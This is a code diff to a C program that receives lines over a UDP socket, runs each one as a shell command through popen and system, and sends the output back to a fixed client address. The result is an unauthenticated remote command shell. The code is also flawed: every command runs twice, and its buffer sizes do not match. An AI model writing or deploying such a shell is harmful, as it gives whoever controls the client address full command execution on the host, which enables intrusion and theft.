@@ -48,7 +48,7 @@ static int check_IP_version(const char *ip, int port, struct sockaddr_storage *a
 
 int main(int argc, char** argv){
   if(argc != 5){
-    fprintf(stderr, "Usage: %s <local IP address > <local PORT> <client IP addres> <client PORT number>\n",argv[1]);
+    fprintf(stderr, "Usage: %s <local IP address > <local PORT> <client IP addres> <client PORT number>\n",argv[0]);
     exit(EXIT_FAILURE);
   }
 
@@ -85,6 +85,20 @@ int main(int argc, char** argv){
         perror("[-] SOKCET");
         exit(EXIT_FAILURE);
     }
+  int opt = 1;
+    if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        perror("[-] setsockopt(SO_REUSEADDR)");
+        close(sockfd);
+        exit(EXIT_FAILURE);
+    }
+
+    #ifdef SO_REUSEPORT
+      if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+          perror("[-] setsockopt(SO_REUSEPORT)");
+          close(sockfd);
+          exit(EXIT_FAILURE);
+      }
+    #endif
 
     
     if (bind(sockfd, (struct sockaddr *)&local_addr, local_addr_len) < 0) {
@@ -99,39 +113,49 @@ int main(int argc, char** argv){
         exit(EXIT_FAILURE);
     }
 
-    {
-        char discard[BUFFSIZE];
-        while (recv(sockfd, discard, sizeof(discard), MSG_DONTWAIT) >= 0)
-            ;
-     }
+  
 
     while(1) {
     char buff[1024];
-    ssize_t n = recvfrom(sockfd, buff, sizeof(buff) - 1, 0,
-                          (struct sockaddr *)&client_addr, &client_addr_len);
-    if (n < 0) {
-        perror("recvfrom (IPv4/UDP)");
+    ssize_t recved = recv(sockfd, buff, sizeof(buff) - 1, 0);
+    if (recved < 0) {
+        perror("recv[-]");
         close(sockfd);
-        return -1;
+        exit(EXIT_FAILURE);
     }
-    buff[n] = '\0';
+
+    buff[recved] = '\0';
+    buff[strcspn(buff, "\r\n")] = '\0';
+
+    if (strlen(buff) == 0) continue;
+
+    char cmd_with_err[BUFFSIZE + 10];
+    snprintf(cmd_with_err, sizeof(cmd_with_err), "%s 2>&1", buff);
+
+    FILE *fp = popen(cmd_with_err, "r");
+    if (fp == NULL) {
+       const char *err_msg = "Error: failed to execute command\n";
+        send(sockfd, err_msg, strlen(err_msg), 0);
+        continue;
+    }
+
     int cmd = system(buff);
 
-      if(cmd == -1){
-      perror("[-]cmd\n"); // this error cause by settting buffer to cmd.
-     }else if(WIFEXITED(cmd) && WEXITSTATUS(cmd) != 0){
-        char err_msg[128];
-        snprintf(err_msg, sizeof(err_msg), 
-        "Error: Command failed with exit status %d\n", WEXITSTATUS(cmd));
-        sendto(sockfd, err_msg, strlen(err_msg), 0,
-        (struct sockaddr *)&client_addr, client_addr_len);
-      } else {
-        const char *success_msg = "Success: Command executed with status 0.\n";
-        sendto(sockfd, success_msg, strlen(success_msg), 0,
-               (struct sockaddr *)&client_addr, client_addr_len);
-      }
-     
+    char response[BUFFSIZE];
+    size_t read = fread(response, 1, sizeof(response) - 1, fp);
+    int status = pclose(fp);
+
+    if (read > 0) {
+        response[read] = '\0';
+        send(sockfd, response, read, 0);
+    } else {
+        char status_msg[128];
+        snprintf(status_msg, sizeof(status_msg),
+                 "(Command executed with exit code %d, no stdout output)\n",
+                 WEXITSTATUS(status));
+        send(sockfd, status_msg, strlen(status_msg), 0);
     }
+  }
   close(sockfd);
 
  return 0;
